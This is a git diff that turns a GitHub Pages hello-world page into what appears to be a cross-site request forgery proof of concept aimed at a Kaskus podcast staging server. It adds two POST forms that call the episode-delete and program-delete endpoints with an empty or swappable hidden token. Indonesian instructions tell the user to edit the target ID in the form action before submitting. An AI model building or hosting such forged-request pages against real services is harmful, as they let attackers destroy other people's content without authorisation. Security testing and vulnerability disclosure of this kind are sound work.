@@ -1,7 +1,16 @@
 <!DOCTYPE html>
-<html>
 <body>
-<h1>Hello World</h1>
-<p>I'm hosted with GitHub Pages.</p>
+    <p>
+        Sebelum submit lakukan inspect element dan ganti &lt; episode-id &gt; atau &lt; program-url &gt; di form action dengan value yang sesuai.<br>
+        Input type hidden juga bisa diganti valuenya.
+    </p>
+    <form method="POST" action="https://podcast-staging.kaskus.co.id/episode/delete/<episode-id>">
+        <input type="hidden" name="token" value="">
+        <button>Delete Episode</button>
+    </form>
+    <br>
+    <form method="POST" action="https://podcast-staging.kaskus.co.id/program/delete/<program-url>">
+        <input type="hidden" name="token" value="">
+        <button>Delete Program</button>
+    </form>
 </body>
-</html>
